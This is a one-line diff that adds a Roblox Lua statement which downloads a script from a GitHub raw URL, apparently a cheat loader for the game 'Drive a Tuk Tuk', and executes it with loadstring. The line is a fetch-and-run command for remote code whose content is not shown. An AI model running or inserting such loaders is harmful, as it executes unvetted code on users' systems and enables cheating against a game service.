@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/drive-a-tuk-tuk-spam0-hohu41jvjpnhib.lua"))()
